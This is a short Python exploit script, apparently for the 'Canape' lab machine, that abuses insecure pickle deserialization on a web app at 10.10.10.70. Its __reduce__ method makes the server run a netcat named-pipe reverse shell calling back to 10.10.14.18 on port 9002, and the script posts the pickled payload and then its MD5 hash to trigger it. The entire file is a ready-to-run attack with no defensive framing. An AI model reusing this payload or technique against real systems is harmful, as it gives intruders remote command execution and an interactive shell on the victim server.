#coding:utf-8

import requests
import hashlib
import pickle
import os

class Canape(object):
	def __reduce__(self):
		'''
		A function that will execute
		the code in the remote server in __reduce__().
		'''
		return(os.system, ('echo Homer;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 9002 >/tmp/f', ))

	def PickleObjs(self):
		'''
		Here there is the serialization of data,
		and the exploitation of flaws in the system __PickleObjs__().
		'''
		self.dumps   = pickle.dumps(Canape())
		self.request = requests.post("http://10.10.10.70/submit", data={"character":self.dumps, "quote":"\n"})

		self.convert = hashlib.md5(self.dumps + "\n").hexdigest()
		self.request = requests.post("http://10.10.10.70/check", data={"id":self.convert})

if __name__ == "__main__":
	Canape().PickleObjs()
